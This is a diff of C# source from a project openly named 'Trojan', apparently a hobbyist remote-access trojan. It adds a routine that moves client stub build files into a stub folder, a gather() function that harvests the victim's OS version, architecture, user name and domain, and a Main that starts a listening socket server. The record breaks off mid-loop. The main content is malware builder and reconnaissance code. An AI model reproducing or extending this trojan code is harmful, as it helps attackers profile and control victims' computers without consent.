@@ -1,39 +1,87 @@
 ﻿using System;
+using System.Text;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
 using Trojan.server;
-using Trojan.client;
 using SocketData;
 
 namespace Trojan
 {
     public class TrojanBaseClass
     {
-        static internal void BuildTrojanStub()
+        static internal void MoveTrojanStub()
         {
-            Process new_process = new Process();
-            ProcessStartInfo new_processStartInfo = new_process.StartInfo;
+            //string[] BuildFiles = Directory.GetFiles(TrojanStubLocation);
 
-            new_processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            new_processStartInfo.FileName = "cmd.exe";
-            //new_processStartInfo.Arguments = "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe /reference:"bin / Debug / net6.0 / Trojan.dll" /reference:"C:/ Windows / Microsoft.NET / Framework64 / v4.0.30319 / System.Runtime.dll" /reference:"C:/ Windows / Microsoft.NET / Framework64 / v4.0.30319 / System.Net.Primitives.dll" -out:TrojanBuild/trojan.exe client\client.cs";
+            string[] accepted_files = new string[4]
+            {
+                "client.dll",
+                "client.exe",
+                "client.runtimeconfig.json",
+                "Trojan.dll"
+            };
 
-            new_process.StartInfo = new_processStartInfo;
-            new_process.Start();
+            string TrojanStubLocation = @"C:\Users\lasse\source\repos\Trojan\client\bin\Debug\net6.0";
+            string new_TrojanStubLocation = @"C:\Users\lasse\source\repos\Trojan\stub";
 
-            new_process.WaitForExit();
-            new_process.Close();
+            if (Directory.Exists(new_TrojanStubLocation) && Directory.GetFiles(TrojanStubLocation).Length > 0)
+            {
+                string[] OldBuildFiles = Directory.GetFiles(new_TrojanStubLocation);
+                foreach (string FileToDelete in OldBuildFiles)
+                {
+                    File.Delete(FileToDelete);
+                }
+            }
+            else { Directory.CreateDirectory(new_TrojanStubLocation); }
+
+            string[] BuildFiles = Directory.GetFiles(TrojanStubLocation);
+
+            string[] NewPathSplit;
+            string NewPath;
+            foreach (string NewFilePath in BuildFiles)
+            {
+                NewPathSplit = NewFilePath.Split("\\");
+                NewPath = NewPathSplit[NewPathSplit.Length - 1];
+                for(int i = 0; i < accepted_files.Length; i++)
+                {
+                    if (NewPath == accepted_files[i])
+                    {
+                        File.Move(NewFilePath, new_TrojanStubLocation + "\\" + NewPath);
+                    }
+                }
+            }
+        }
+
+        public static string gather()
+        {
+            StringBuilder CommandOutput = new StringBuilder();
+
+            if(SocketHandler.BUILDFOR == "windows10")
+            {
+                CommandOutput.AppendLine("\t[+] " + Environment.OSVersion.ToString());
+                CommandOutput.AppendLine("\t[+] " + Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE"));
+                CommandOutput.AppendLine("\t[+] " + RuntimeInformation.OSArchitecture.ToString());
+                CommandOutput.AppendLine("\t[+] " + Environment.SystemDirectory);
+                CommandOutput.AppendLine("\t[+] " + Environment.UserName);
+                CommandOutput.AppendLine("\t[+] " + Environment.UserDomainName);
+                CommandOutput.Append("\t[+] " + Environment.Version.ToString());
+            }
+
+            return(CommandOutput.ToString());
         }
 
         public Server server = new Server();
-        public Client client = new Client();
 
-        static async Task Main()
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        public static void Main()
         {
             TrojanBaseClass TrojanBase = new TrojanBaseClass();
 
             TrojanBase.server.Init_Server(SocketHandler.PORT, SocketHandler.BUFFSIZE);
-            await TrojanBase.client.Init_Client(SocketHandler.PORT, SocketHandler.BUFFSIZE);
 
+            MoveTrojanStub();
             while(true)
             {
  
